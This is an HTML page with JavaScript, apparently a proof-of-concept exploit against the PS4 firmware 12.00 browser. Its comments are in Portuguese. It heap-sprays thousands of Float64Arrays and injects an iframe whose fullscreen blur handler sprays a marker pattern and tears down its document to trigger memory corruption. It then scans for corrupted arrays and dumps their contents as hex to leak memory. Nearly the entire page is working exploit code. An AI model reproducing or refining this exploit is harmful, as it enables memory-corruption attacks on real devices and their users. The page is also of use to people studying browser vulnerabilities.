<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Success Return - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - Estabilização Final</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos</button>
    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (Dump 0-63)</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 11px;"></div>
    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; 
        let controllers = [];
        const statusPai = document.getElementById('status-pai');
        const leakOutput = document.getElementById('leak-output');

        function prepareObjects() {
            controllers = [];
            // Voltamos ao tamanho 64 que é um bom meio-termo para ver além dos zeros
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(64); 
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos Prontos.";
            statusPai.style.color = "blue";
        }

        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:100px; border:1px solid red;"></iframe>';
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html><body><button onclick="st()">START FS + OPTIONS</button>
                <script>
                    function st() {
                        document.documentElement.webkitRequestFullscreen();
                        window.onblur = function() {
                            // Spray Ultra-Simples e Massivo
                            var s = new Array(20000);
                            for(var i = 0; i < 20000; i++) {
                                s[i] = new Float64Array(64).fill(${PATTERN});
                            }
                            // O Teardown precisa ser agressivo
                            document.open();
                            document.write('<h1>CRASH</h1>');
                            document.close();
                        };
                    }
                <\/script></body></html>
            `);
            fDoc.close();
        }

        function checkPersistence() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                // Detectamos QUALQUER mudança no ID original
                if (controllers[i][0] !== i) {
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO NO ID: " + corruptedIndex + "</span>";
                leakOutput.style.display = "block";
                leakOutput.innerHTML = "<b>[ DUMP 0-63 ]</b><br>";

                for(let i = 0; i < 64; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141"));
                    let style = isInteresting ? "color:#fff; background:#a00;" : "";
                    
                    let br = (i % 4 === 3) ? "<br>" : "";
                    leakOutput.innerHTML += "O[" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
                }
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Reinicie o navegador e tente novamente.</span>";
            }
        }
    </script>
</body>
</html>
